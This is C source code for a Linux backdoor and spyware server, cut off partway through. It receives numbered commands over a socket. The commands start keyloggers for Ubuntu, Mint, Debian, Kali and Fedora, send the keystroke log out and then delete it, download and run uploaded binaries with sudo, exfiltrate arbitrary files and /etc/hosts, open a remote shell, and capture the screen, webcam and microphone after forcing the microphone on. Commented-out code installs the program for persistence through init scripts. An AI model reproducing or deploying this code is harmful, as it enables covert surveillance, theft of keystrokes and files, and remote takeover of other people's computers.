#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>  // umask(), S_ISDIR(), stat()

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>  //strlen()
#include <errno.h>  // perror()
#include <syslog.h>  // syslog()
#include <getopt.h>

#include <pthread.h> //pthread_create(), pthread_join()

#include <gtk-2.0/gtk/gtk.h>
#include <gst/gst.h>

#include <arpa/inet.h>  // send(), recv(), IPPROTO_TCP, SOCKADDR_IN ect ....
#include <sys/stat.h>   // umask()

#include "../includes/constants.h"
#include "../includes/utils.h"
#include "../includes/keylogger/keylogger.h"

static SOCKET sock = 0;
static SOCKET csock = 0;
static int on_video = -1;

int main(int argc, char *argv[])
{
/*
    // Make hodin_daemon.sh script executable
    if(system("chmod +x script/hodin_daemon.sh") == -1)
    {
        error("system() make exec hodin_daemon.sh", "main()");
        return 0;
    }

    // Make delete_startup.sh script executable
    if(system("chmod +x script/delete_startup.sh") == -1)
    {
        error("system() make exec delete_startup.sh", "main()");
        return 0;
    }

    // Make startup.sh script executable
    if(system("chmod +x script/startup.sh") == -1)
    {
        error("system() make exec startup.sh", "main()");
        return 0;
    }

    // Copy hodin_daemon.sh script in /etc/init.d
    if(system("cp script/hodin_daemon.sh /etc/init.d/") == -1)
    {
        error("system() copy hodin_daemon.sh in /etc/init.d/", "main()");
        return 0;
    }

    // Copy executable file in /usr/bin/
    if(system("cp srv_hodin /usr/bin/") == -1)
    {
        error("system() copy srv_hodin in /usr/bin/", "main()");
        return 0;
    }

    // Copy executable file in /usr/sbin/
    if(system("cp srv_hodin /usr/sbin/") == -1)
   {
        error("system() copy srv_hodin in /usr/sbin/", "main()");
        return 0;
    }

    // Create a symbolic link with hodin_daemon.sh
    if(system("ln -s /etc/init.d/hodin_daemon.sh /etc/rc2.d/S88hodin_daemon.sh") == -1)
    {
        error("system() hodin_daemon.sh symbolic link", "main()");
        return 0;
    }
    */

    // Initialize GStreamer
    gst_init(&argc, &argv);

    // Initialize GTK */
    //gtk_init(&argc, &argv);

    //daemonize();

    dispatch_modules(argv);

    return EXIT_SUCCESS;
}

void dispatch_modules(char *argv[])
{
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    SOCKADDR_IN csin;
    socklen_t crecsize = sizeof(csin);

    int option = 1;
    size_t flag = 0;

    FILE *log_file = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;
    char caractereLu = 0;
    int i = 0;

    char buffer[MAXDATASIZE] = "";

    pthread_t thread_remote_shell = 0;

    pthread_t thread_downloader = 0;
    pthread_t thread_receive_upload = 0;
    pthread_t thread_hosts_downloader = 0;

    pthread_t thread_get_screenshot = 0;
    pthread_t thread_get_multi_screenshot = 0;
    pthread_t thread_send_resolution = 0;

    pthread_t record_webcam_thread = 0;
    pthread_t record_audio_thread = 0;

    pthread_t stream_desktop_thread = 0;
    //pthread_t stream_webcam_thread = 0;

    pthread_t thread_gather_infos = 0;


    //char *ubuntu_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ toggle"; /* A TESTER  */
    const char *ubuntu_check_mic_cmd = "amixer sset Capture cap";
    const char *ubuntu_gain_mic_cmd = "amixer sset Capture 100%";

    const char *kali_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ 0";
    const char *kali_set_gain_cmd = "pactl set-sink-volume @DEFAULT_SINK@ 100%";

    const char *debian_gain_mic_cmd = "amixer sset Capture 100%";
    const char *debian_check_mic_cmd = "amixer sset Capture cap";


    //FILE *ubuntu_unmute_mic_pipe = NULL;
    //FILE *ubuntu_gain_mic_pipe = NULL;

    FILE *mint_unmute_mic_pipe = NULL;
    FILE *mint_gain_mic_pipe = NULL;

    FILE *kali_set_gain_pipe = NULL;
    FILE *kali_gain_mic_pipe = NULL;

    FILE *debian_set_gain_pipe = NULL;
    FILE *debian_unmute_mic_pipe = NULL;

    FILE *fedora_set_gain_pipe = NULL;
    FILE *fedora_unmute_mic_pipe = NULL;
    FILE *fedora_xhost_cmd = NULL;

    const char *fedora_xhost = "xhost +si:localuser:root";


    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "dispatch_modules()");
        return;
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(PORT);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, (char*)&option, sizeof(option)) == SOCKET_ERROR)
    {
        error("setsockopt()", "dispatch_modules()");
        return;
    }

    if(bind(sock, (SOCKADDR*)&sin, recsize) == SOCKET_ERROR)
    {
        error("bind()", "dispatch_modules()");
        return;
    }

    for(;;)
    {
        printf("\nServer en ecoute \n");

        if(listen(sock, 3) == SOCKET_ERROR)
        {
            error("listen,()", "dispatch_modules()");
            return;
        }

        csock = accept(sock, (SOCKADDR*)&sin, &crecsize);
        if(csock == INVALID_SOCKET)
        {
            error("accept()", "dispatch_modules()");
            return;
        }

        if(recv(csock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
        {
            error("recv() flag", "dispatch_modules()");
            return;
        }

        printf("flag received : %ld\n", flag);

        /*
        if(flag == 1)
        {
            printf("\t\tSTARTING UBUNTU 16.04 KEYLOGGER ....\n");
            ubuntu16_keylogger_init();
        }
        */

        if(flag == 2)
        {
            printf("\t\tSTARTING UBUNTU 24 KEYLOGGER ....\n");
            ubuntu24_keylogger_init();
        }

        if(flag == 3)
        {
            printf("\t\tSTARTING MINT 22 KEYLOGGER ....\n");
            mint_keylogger_init();
        }

        if(flag == 4)
        {
            printf("\t\tSTARTING DEBIAN 12.6 KEYLOGGER ....\n");
            debian_keylogger_init();
        }

        if(flag == 5)
        {
            printf("\t\tSTARTING KALI 2024 KEYLOGGER ....\n");
            kali_keylogger_init();
        }

        if(flag == 11)
        {
            printf("\t\tSTARTING FEDORA 40 KEYLOGGER ....\n");
            fedora_keylogger_init();
        }

        if(flag == 6)
        {
            printf("\t\tSENDING LOG FILE ....\n");

            log_file = fopen("/var/log/userlog.log", "r+");
            if(log_file == NULL)
            {
                error("fopen() log_file", "dispatch_modules()");
                return;
            }

            while((caractereLu = fgetc(log_file)) != EOF)
            {
                buffer[i] = caractereLu;
                i++;
            }

            fseek(log_file, 0, SEEK_END);
            file_size = ftell(log_file);
            rewind(log_file);

            // Envoie de la taille du fichier txt
            if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
            {
                error("send() file_size", "dispatch_modules()");
                return;

            }

            printf("Weight of the file send with success : %ld octets\n", file_size);

            do
            {
                dataRead = fread(buffer, sizeof(char), file_size, log_file);
                if(dataRead < 0)
                {
                    perror("fread ");
                    return;
                }

                dataSend = send(csock, buffer, file_size, 0);

                //printf("Envoie de %ld octets\n", dataSend);

                if(dataSend < 0)
                {
                    perror("send() ");
                    exit(errno);
                }

                totalSend += dataSend;

            }while(totalSend < file_size);

            printf("File totaly send with success : %ld\n", dataSend);

            fclose(log_file);

            if(system("rm -rf /var/log/userlog.log") == -1)
            {
                error("system() userlog.log", "dispatch_modules()");
                return;
            }

            //close(csock);
        }

        if(flag == 7)
        {
            printf("\t\tRECEIVING UPLOADED FILE ...\n");

            if(pthread_create(&thread_receive_upload, NULL, (void* (*)(void*))recv_upload, NULL) == -1)
            {
                error("pthread_create() thread_receive_upload", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_receive_upload, NULL))
            {
                perror("pthread_join");
                return;
            }
        }

        // REMOTE SHELL
        if(flag == 8)
        {
            printf("\t\tSTARTING REMOTE SHELL ....\n");

            if(pthread_create(&thread_remote_shell, NULL, (void* (*)(void*))start_remote_shell, argv) == -1)
            {
                error("pthread_create() start_remote_shell", "dispatch_modules()");
                return;
            }

            if (pthread_join(thread_remote_shell, NULL))
            {
                perror("pthread_join");

                return;
            }
        }

        if(flag == 9)
        {
            printf("\t\tSENDING FILE TO DOWNLOAD ....\n");

            if(pthread_create(&thread_downloader, NULL, (void* (*)(void*))send_dowloaded_file, NULL) == -1)
            {
                error("pthread_create() send_dowloaded_file", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_downloader, NULL))
            {
                perror("pthread_join");
                return;
            }
        }

        if(flag == 15)
        {
            printf("\t\tSENDING BINARIE TO DOWNLOAD ....\n");
            if(pthread_create(&thread_downloader, NULL, (void*(*)(void*))send_dowloaded_binarie, NULL) == -1)
            {
                error("pthread_create() send_dowloaded_binarie", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_downloader, NULL) != 0)
            {
                perror("pthread_join");
                return;
            }
        }

        if(flag == 10)
        {
            printf("\t\tSENDING HOSTS TO DOWNLOAD ....\n");
            if(pthread_create(&thread_hosts_downloader, NULL, (void* (*) (void *))send_hosts_file, NULL) == -1)
            {
                error("pthread_create() send_hosts_file", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_hosts_downloader, NULL))
            {
                perror("pthread_join");
                return;
            }
        }


        if(flag == 19)
        {
            printf("\t\t - TAKING SCREENSHOT STARTED - \n");

            if(pthread_create(&thread_get_screenshot, NULL, (void*(*)(void*))upload_screenshot_file, NULL) == -1)
            {
                error("pthread_create() thread_get_screenshot", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_get_screenshot, NULL))
            {
                perror("pthread_join");
                return;
            }
        }

        if(flag == 21)
        {
            printf("\t\t - TAKING MULTI SCREENSHOT STARTED - \n");

            if(pthread_create(&thread_get_multi_screenshot, NULL, (void*(*)(void*))upload_multi_screenshot_files, NULL) == -1)
            {
                error("pthread_create() thread_get_multi_screenshot", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_get_multi_screenshot, NULL))
            {
                perror("pthread_join");
                return;
            }
        }

        if(flag == 22)
        {
            printf("\t\t - EXITING KEYLOGGER - \n");

            pthread_exit(NULL);
        }

        if(flag == 23)
        {
            printf("\t\t - GATHER INFOS - \n");

            if(pthread_create(&thread_gather_infos, NULL, (void*(*)(void*))gather_infos, NULL) == -1)
            {
                error("pthread_create() thread_gather_infos", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_gather_infos, NULL))
            {
                perror("pthread_join");
                return;
            }
        }


        if(flag == 20)
        {
            printf("\t\tSENDING RESOLUTION....\n");

            if(pthread_create(&thread_send_resolution, NULL, (void*(*)(void*))get_screen_resolution, NULL) == -1)
            {
                error("pthread_create() get_screen_resolution", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(thread_send_resolution, NULL))
            {
                perror("pthread_join");

                return;
            }
        }

        if(flag == 12)
        {
            printf("\t\t - STREAMING THE REMOTE DESKTOP STARTED - \n");

            // Call the thread that will execute the stream command
            if(pthread_create(&stream_desktop_thread, NULL, (void*(*)(void*))stream_desktop, NULL) == -1)
            {
                error("pthread_create() stream_desktop_thread", "dispatch_modules()");
                return;
            }

            if(pthread_join(stream_desktop_thread, NULL) != 0)
            {
                perror("pthread_join");
                return;
            }
        }

        if(flag == 14)
        {
            printf("\t\tRECORD WEBCAM STARTED....\n");

            on_video = 1;

            // Call the thread that will execute the stream command
            if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))execute_record_cmd, NULL) == -1)
            {
                error("pthread_create() record_webcam_thread", "dispatch_modules()");
                return;
            }

            if(pthread_join(record_webcam_thread, NULL) != 0)
            {
                perror("pthread_join");
                return;
            }
        }

          if(flag == 17)
        {
            printf("\t\tRECORD AUDIO STARTED....\n");

            on_video = 0;

            char buffer[256] = "";
            FILE *pipe = NULL;

            const char *command = "";

            //command = "lsb_release -a";
            command = "cat /etc/*-release";

            pipe = popen(command, "r");
            if(pipe == NULL)
            {
                error("popen() command", "dispatch_modules()");
                return;
            }

            if(fgets(buffer, 256, pipe) == NULL)
            {
                error("fgets() buffer pipe", "dispatch_modules()");
                return;
            }

            buffer[strlen(buffer) - 1] = 0;


            // Checking if we are on Ubuntu
            if(strstr(buffer, "Distributor ID:	Ubuntu") != NULL)
            {
                printf(" We are on Ubuntu\n");

                mint_gain_mic_pipe = popen(ubuntu_check_mic_cmd, "w");
                if(mint_gain_mic_pipe == NULL)
                {
                    error("popen() ubuntu_check_mic_cmd for Ubuntu", "dispatch_modules()");
                    return;
                }

                mint_unmute_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
                if(mint_unmute_mic_pipe == NULL)
                {
                    error("popen() ubuntu_gain_mic_cmd for Ubuntu", "dispatch_modules()");
                    return;
                }

                if(pclose(mint_unmute_mic_pipe) == -1)
                {
                    printf("Fail to close mint_unmute_mic_pipe!\n");
                    return;
                }

                if(pclose(mint_gain_mic_pipe) == -1)
                {
                    printf("Fail to close mint_gain_mic_pipe!\n");
                    return;
                }
            }

            // Checking if we are on kali
            if(strstr(buffer, "Distributor ID:	Kali") != NULL)
            {
                printf(" We are on Kali\n");

                kali_gain_mic_pipe = popen(kali_check_gain_cmd, "w");
                if(kali_gain_mic_pipe == NULL)
                {
                    error("popen() kali_check_gain_cmd", "dispatch_modules()");
                    return;
                }

                kali_set_gain_pipe = popen(kali_set_gain_cmd, "w");
                if(kali_set_gain_pipe == NULL)
                {
                    error("popen() kali_set_gain_pipe", "dispatch_modules()");
                    return;
                }

                if(pclose(kali_set_gain_pipe) == -1)
                {
                    printf("Fail to close kali_set_gain_pipe!\n");
                    return;
                }

                if(pclose(kali_gain_mic_pipe) == -1)
                {
                    printf("Fail to close kali_gain_mic_pipe!\n");
                    return;
                }
            }

            // Checking if we are on Debian
            if(strstr(buffer, "Distributor ID:	Debian") != NULL)
            {
                printf(" We are on Debian\n");

                debian_unmute_mic_pipe = popen(debian_check_mic_cmd, "w");
                if(debian_unmute_mic_pipe == NULL)
                {
                    error("popen() debian_unmute_mic_pipe", "dispatch_modules()");
                    return;
                }

                printf("Cmd 1 Ok\n");

                debian_set_gain_pipe = popen(debian_gain_mic_cmd, "w");
                if(debian_set_gain_pipe == NULL)
                {
                    error("popen() debian_set_gain_pipe", "dispatch_modules()");
                    return;
                }

                printf("Cmd 2 Ok\n");

                if(pclose(debian_unmute_mic_pipe) == -1)
                {
                    printf("Fail to close debian_unmute_mic_pipe!\n");
                    return;
                }

                if(pclose(debian_set_gain_pipe) == -1)
                {
                    printf("Fail to close debian_set_gain_pipe!\n");
                    return;
                }
            }

            // Checking if we are on Mint19
            if(strstr(buffer, "Distributor ID:	LinuxMint") != NULL)
            {
                printf(" We are on Mint19\n");

                mint_gain_mic_pipe = popen(ubuntu_check_mic_cmd, "w");
                if(mint_gain_mic_pipe == NULL)
                {
                    error("popen() ubuntu_check_mic_cmd for Mint", "dispatch_modules()");
                    return;
                }

                mint_unmute_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
                if(mint_unmute_mic_pipe == NULL)
                {
                    error("popen() ubuntu_gain_mic_cmd for Mint", "dispatch_modules()");
                    return;
                }

                if(pclose(mint_unmute_mic_pipe) == -1)
                {
                    printf("Fail to close mint_unmute_mic_pipe!\n");
                    return;
                }

                if(pclose(mint_gain_mic_pipe) == -1)
                {
                    printf("Fail to close mint_gain_mic_pipe!\n");
                    return;
                }
            }

            // Checking if we are on Fedora 30
            if(strstr(buffer, "Fedora release 30 (Thirty)") != NULL)
            {
                printf("We are on Fedora 30\n");

                fedora_xhost_cmd = popen(fedora_xhost, "w");
                if(fedora_xhost_cmd == NULL)
                {
                    error("popen() fedora_xhost_cmd", "dispatch_modules()");
                    return;
                }

                fedora_unmute_mic_pipe = popen(debian_check_mic_cmd, "w");
                if(fedora_unmute_mic_pipe == NULL)
                {
                    error("popen() fedora_unmute_mic_pipe", "dispatch_modules()");
                    return;
                }

                fedora_set_gain_pipe = popen(debian_gain_mic_cmd, "w");
                if(fedora_set_gain_pipe == NULL)
                {
                    error("popen() fedora_set_gain_pipe", "dispatch_modules()");
                    return;
                }

                if(pclose(fedora_unmute_mic_pipe) == -1)
                {
                    printf("Fail to close mint_unmute_mic_pipe!\n");
                    return;
                }

                if(pclose(fedora_set_gain_pipe) == -1)
                {
                    printf("Fail to close mint_gain_mic_pipe!\n");
                    return;
                }

                if(pclose(fedora_xhost_cmd) == -1)
                {
                    printf("Fail to close fedora_xhost_cmd!\n");
                    return;
                }
            }

            if(pclose(pipe) == -1)
            {
                printf("Fail to close pipe!\n");
                return;
            }

            if(pthread_create(&record_audio_thread, NULL, (void*(*)(void*))execute_record_cmd, NULL) == -1)
            {
                error("pthread_create() record_audio_thread", "dispatch_modules()");
                return;
            }

            if(pthread_join(record_audio_thread, NULL) != 0)
            {
                perror("pthread_join");
                return;
            }
        }

        if(flag == 18)
        {
            printf("\t\t - STREAMING THE REMOTE WEBCAM STARTED - \n");
            stream_webcam();

            /*
            // Call the thread that will execute the stream command
            if(pthread_create(&stream_webcam_thread, NULL, (void*(*)(void*))stream_webcam, NULL) == -1)
            {
                error("pthread_create() stream_webcam_thread", "dispatch_modules()");
                return;
            }

            if(pthread_join(stream_webcam_thread, NULL) != 0)
            {
                perror("pthread_join");
                return;
            }
            */
        }
    }

    return;
}

void* recv_upload()
{
    FILE *log = NULL;
    FILE *pipe[3] = {NULL};

    size_t tailleBlockRecut = 0;
    long totalRcv = 0;
    char *buffer = NULL;

    char *cmd_1 = NULL;
    char *cmd_2 = NULL;
    char *cmd_3 = NULL;

    long weight = 0;
    size_t len = 0;

    char *log_name = NULL;
    int installed = 0;

    if(recv(csock, (char*)&weight, sizeof(weight), 0) != SOCKET_ERROR)
        printf("\n\nPoid du fichier reçut : %ld octets\n", weight);

    else
    {
        error("recv() weight", "recv_upload()");
        pthread_exit(NULL);
    }

    buffer = malloc(weight * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "recv_upload()");
        pthread_exit(NULL);
    }

    if(recv(csock, (char*)&len, sizeof(len), 0) == SOCKET_ERROR)
        error("recv() len", "recv_upload()");

    log_name = malloc(len * sizeof(char));
    if(log_name == NULL)
    {
        error("malloc() log_name", "recv_upload()");
        pthread_exit(NULL);
    }

    if(recv(csock, log_name, len, 0) == SOCKET_ERROR)
        error("recv() log_name", "recv_upload()");

    log = fopen(log_name, "wb");
    if(log == NULL)
    {
        error("fopen() log", "recv_upload()");
        pthread_exit(NULL);
    }

    cmd_1 = malloc((15 + len) * sizeof(char));
    if(cmd_1 == NULL)
    {
        error("malloc() cmd_1", "recv_upload()");
        pthread_exit(NULL);
    }

    cmd_2 = malloc((14 + len) * sizeof(char));
    if(cmd_2 == NULL)
    {
        error("malloc() cmd_2", "recv_upload()");
        pthread_exit(NULL);
    }

    cmd_3 = malloc(weight * sizeof(char));
    if(cmd_3 == NULL)
    {
        error("malloc() cmd_3", "recv_upload()");
        pthread_exit(NULL);
    }

    cmd_1 = strcpy(cmd_1, "sudo chmod 777 ");
    cmd_1 = strcat(cmd_1, log_name);

    cmd_2 = strcpy(cmd_2, "sudo chmod +x ");
    cmd_2 = strcat(cmd_2, log_name);

    cmd_3 = strcpy(cmd_3, "sudo ");
    cmd_3 = strcat(cmd_3, "./");
    cmd_3 = strcat(cmd_3, log_name);

    do
    {
        tailleBlockRecut = recv(csock, buffer, sizeof(weight), 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, log);

        totalRcv += tailleBlockRecut;

    }while(totalRcv < weight);


    printf("\n\npipe cmd 1\n\n");

    pipe[0] = popen(cmd_1, "r");
    if(pipe[0] == NULL)
    {
        error("popen() pipe[0]", "recv_upload()");
        pthread_exit(NULL);
    }

    fclose(log);
    pclose(pipe[0]);

     printf("\n\npipe cmd 2\n\n");

    pipe[1] = popen(cmd_2, "r");
    if(pipe[1] == NULL)
    {
        error("popen() pipe[1]", "recv_upload()");
        pthread_exit(NULL);
    }

    printf("\n\npipe cmd 3\n\n");

    pipe[2] = popen(cmd_3, "r");
    if(pipe[2] == NULL)
    {
        error("popen() pipe[2]", "recv_upload()");

        installed = 0;
        if(send(csock, (char*)&installed, sizeof(installed), 0) == -1)
            error("send() installed pipe[2]", "recv_upload()")

        pclose(pipe[1]);
        pclose(pipe[2]);

        free(log_name);

        free(buffer);
        free(cmd_1);
        free(cmd_2);
        free(cmd_3);

        pthread_exit(NULL);
    }

    pclose(pipe[1]);
    pclose(pipe[2]);
    installed = 1;

    if(send(csock, (char*)&installed, sizeof(installed), 0) == -1)
        error("send() installed", "recv_upload()")

    free(log_name);

    free(buffer);

    free(cmd_1);
    free(cmd_2);
    free(cmd_3);

    pthread_exit(NULL);
}

void* send_dowloaded_file(void)
{
    gchar *file_path = NULL;
    size_t len_file_path = 0;

    FILE *on_download = NULL;

    char *buffer = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;

    if(recv(csock, (char*)&len_file_path, sizeof(len_file_path), 0) == -1)
    {
        error("recv() len_file_path", "send_dowloaded_file()");
        pthread_exit(NULL);
    }

    file_path = malloc(len_file_path * sizeof(char));
    if(file_path == NULL)
    {
        error("malloc() file_path", "send_dowloaded_file()");
        pthread_exit(NULL);
    }

    printf("len path = %ld\n\n", len_file_path);

    if(recv(csock, file_path, len_file_path, 0) == -1)
    {
        error("recv() file_path", "send_dowloaded_file()");
        pthread_exit(NULL);
    }

    printf("path = %s\n", file_path);


    struct stat *fichier = malloc(sizeof(struct stat));

    stat(file_path, fichier);
    if(S_ISDIR(fichier->st_mode) == 1)
    {
        free(file_path);
        pthread_exit(NULL);
    }

    on_download = fopen(file_path, "rb");
    if(on_download == NULL)
    {
        error("fopen() on_download", "send_dowloaded_file()");
        pthread_exit(NULL);
    }

    fseek(on_download, 0, SEEK_END);
    file_size = ftell(on_download);
    rewind(on_download);

    /** Envoie de la taille du fichier txt **/
    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
    {
        error("send() file_size", "send_dowloaded_file()");
        pthread_exit(NULL);

    }

    printf("Weight of the file send with success : %ld octets\n", file_size);

    buffer = malloc(file_size * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "send_dowloaded_file()");
        free(file_path);
        fclose(on_download);
        pthread_exit(NULL);
    }

    do
    {
        dataRead = fread(buffer, file_size, sizeof(char), on_download);
        if(dataRead < 0)
        {
            perror("fread ");
            pthread_exit(NULL);
        }

        dataSend = send(csock, buffer, file_size, 0);

        if(dataSend < 0)
        {
            perror("send() ");
            pthread_exit(NULL);
        }

        totalSend += dataSend;

    }while(totalSend < file_size);

    printf("File totaly send with success : %ld\n", dataSend);

    fclose(on_download);

    free(fichier);
    free(file_path);
    free(buffer);

    pthread_exit(NULL);
}

void *send_dowloaded_binarie(void)
{
    gchar *file_path = NULL;
    size_t len_file_path = 0;

    FILE *on_download = NULL;

    char *buffer = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;

    if(recv(csock, (char*)&len_file_path, sizeof(len_file_path), 0) == -1)
    {
        error("recv() len_file_path", "send_dowloaded_binarie()");
        pthread_exit(NULL);
    }

    file_path = malloc(len_file_path * sizeof(char));
    if(file_path == NULL)
    {
        error("malloc() file_path", "send_dowloaded_binarie()");
        pthread_exit(NULL);
    }

    printf("len path = %zd\n\n", len_file_path);

    if(recv(csock, file_path, len_file_path, 0) == -1)
    {
        error("recv() file_path", "send_dowloaded_binarie()");
        pthread_exit(NULL);
    }

    printf("path = %s\n", file_path);


    /*
    struct stat *fichier = malloc(sizeof(struct stat));

    stat(file_path, fichier);
    if(S_ISDIR(fichier->st_mode) == 1)
    {
        free(file_path);
        pthread_exit(NULL);
    }
    */

    on_download = fopen(file_path, "rb");
    if(on_download == NULL)
    {
        error("fopen() on_download", "send_dowloaded_binarie()");
        pthread_exit(NULL);
    }

    fseek(on_download, 0, SEEK_END);
    file_size = ftell(on_download);
    rewind(on_download);

    buffer = malloc(file_size * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc buffer", "send_dowloaded_binarie()");
        pthread_exit(NULL);
    }

    /** Envoie de la taille du fichier txt **/
    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
    {
        error("send() file_size", "send_dowloaded_binarie()");
        pthread_exit(NULL);

    }

    printf("Weight of the file send with success : %ld octets\n", file_size);

    do
    {
        dataRead = fread(buffer, sizeof(char), sizeof(file_size), on_download);
        if(dataRead < 0)
        {
            perror("fread ");
            pthread_exit(NULL);
        }

        dataSend = send(csock, buffer, sizeof(file_size) , 0);

        if(dataSend < 0)
        {
            perror("send() ");
            pthread_exit(NULL);
        }

        totalSend += dataSend;

    }while(totalSend < file_size);

    printf("File totaly send with success : %ld\n", totalSend);

    fclose(on_download);

    //free(fichier);
    free(file_path);
    free(buffer);

    pthread_exit(NULL);
}


void *send_hosts_file(void)
{
    gchar file_path[10] = "/etc/hosts";
    size_t len_hosts_path = strlen(file_path) + 1;

    FILE *hosts_download = NULL;

    char buffer[MAXDATASIZE] = "";

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;

    if(send(csock, (char*)&len_hosts_path, sizeof(len_hosts_path), 0) == -1)
    {
        error("send() len_hosts_path", "dispatch_modules()");
        exit(1);
    }

    printf("path len sended .... %ld\n\n", len_hosts_path);

    if(send(csock, file_path, len_hosts_path, 0) == -1)
    {
        error("recv() file_path", "dispatch_modules()");
        exit(1);
    }

    printf("path sended  %s....", file_path);

    hosts_download = fopen(file_path, "rb");
    if(hosts_download == NULL)
    {
        error("fopen() hosts_download", "dispatch_modules()");
        exit(1);
    }

    fseek(hosts_download, 0, SEEK_END);
    file_size = ftell(hosts_download);
    rewind(hosts_download);

    /** Envoie de la taille du fichier txt **/
    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
    {
        error("send() file_size", "dispatch_modules()");
        exit(1);
    }

    printf("weight of hosts file sended.... %ld\n\n", file_size);

    do
    {
        dataRead = fread(buffer, file_size, sizeof(char), hosts_download);
        if(dataRead < 0)
        {
            perror("fread ");
            exit(1);
        }

        dataSend = send(csock, buffer, file_size, 0);

        //printf("Envoie de %ld octets\n", dataSend);

        if(dataSend < 0)
        {
            perror("send() dataSend");
            exit(1);
        }

        totalSend += dataSend;

    }while(totalSend < file_size);

    printf("File totaly send with success : %ld\n", dataSend);

    fclose(hosts_download);

    pthread_exit(NULL);
}


/** Remote shell **/
void *start_remote_shell(char *argv[])
{
    pid_t the_son = -1;
    char *shell = NULL;

    FILE *pipe[2] = {NULL};

    char buffer[BUFSIZ]= {""};
    char buffer_cmd[MAXDATASIZE] = {""};
    size_t data_len = 0;
    int ret = 0;

    the_son = fork();
    if(the_son < 0)
    {
        error("fork() the_son", "start_remote_shell()");
        pthread_exit(NULL);
    }

    printf ("\nthe_son = %d\n", the_son);
    if(the_son == 0)
    {
        shell = getenv("SHELL");

        if(shell == NULL)
        {
            error("getenv() shell", "start_remote_shell()");
            pthread_exit(NULL);
        }

        if(execv(shell, &argv[0]) == -1)
        {
            error("execv() shell", "start_remote_shell()");
            pthread_exit(NULL);
        }
    }

    for(;;)
    {
        if(recv(csock, (char*)&data_len, sizeof(data_len), 0) == -1)
        {
            error("recv() data_len", "start_remote_shell()");
            pthread_exit(NULL);
        }

        /* Receive the command */
        ret = recv (csock, buffer, data_len, 0);
        if (ret < 0)
        {
            error("recv() buffer", "start_remote_shell()");
            pthread_exit(NULL);
        }

        buffer[data_len - 1] = '\0';

        if(strncmp(buffer, "quit", 4) == 0)
            pthread_exit(NULL);

        pipe[0] = popen(buffer, "w");
        if(pipe[0] == NULL)
        {
            error("popen() pipe[0]", "start_remote_shell()");
            pthread_exit(NULL);
        }

        /* Send command results */
        pipe[1] =  popen(buffer, "r");
        if(pipe[1] == NULL)
        {
            error("popen() pipe[1]", "start_remote_shell()");
            pthread_exit(NULL);
        }

        ret = fread(buffer_cmd, BUFSIZ, sizeof(char), pipe[1]);
        if(ret < 0)
        {

            error("fread() buffer_cmd", "start_remote_shell()");
            pthread_exit(NULL);
        }

        if(send(csock, buffer_cmd, MAXDATASIZE, 0) == SOCKET_ERROR)
        {
            error("send() buffer_cmd", "start_remote_shell()");
            pthread_exit(NULL);
        }

        clean_buffer(buffer_cmd);
        clean_buffer(buffer);

        if(pclose(pipe[0]) == -1)
        {
            error("pclose() pipe[0]", "start_remote_shell()");
            pthread_exit(NULL);
        }

        if(pclose(pipe[1]) == -1)
        {
            error("pclose() pipe[1]", "start_remote_shell()");
            pthread_exit(NULL);
        }
    }

    pthread_exit(NULL);
}



void daemonize()
{
  pid_t fils;

    fils = fork();

    /** If fork() fail we quit **/
    if(fils < 0)
    {
        syslog(LOG_ERR, "fork() fils : %d : %s", errno, strerror(errno));
        return;
    }

    /** If fork() succeed we stop the father **/
    if(fils > 0)
        exit(EXIT_SUCCESS);

    /** Change of directory and we place us to the root folder **/
    if(chdir("/") < 0)
    {
        syslog(LOG_ERR, "chdir() : %d : %s", errno, strerror(errno));
        return;
    }

    /** No rights on the files/folder created **/
    umask(0);


    /**  Redirect standard I/O for cancel all user terminal messages **/
    if(freopen("/dev/null", "r", stdin) == NULL )
    {
        error("freopen() stdin", "daemonize_keylogger()");
        return;
    }

    if(freopen("/dev/null", "w", stdout) == NULL )
    {
        error("freopen stdout", "daemonize_keylogger()");
        return;
    }

    if(freopen("/dev/null", "w", stderr) == NULL )
    {
        error("freopen stderr", "daemonize_keylogger()");
        return;
    }

    return;
}

// Get the screen reslution for taking a screenshot
void *get_screen_resolution(void)
{
    FILE *screen_reso_pipe = NULL;
    const gchar *reso_cmd = "xrandr --verbose | grep *current";
    gchar buffer_screen_reso[62] = "";
    char *final_resolution = NULL;
    long weight = 0;
    size_t final_reso_len = 0;

    screen_reso_pipe = popen(reso_cmd, "r");
    if(screen_reso_pipe == NULL)
    {
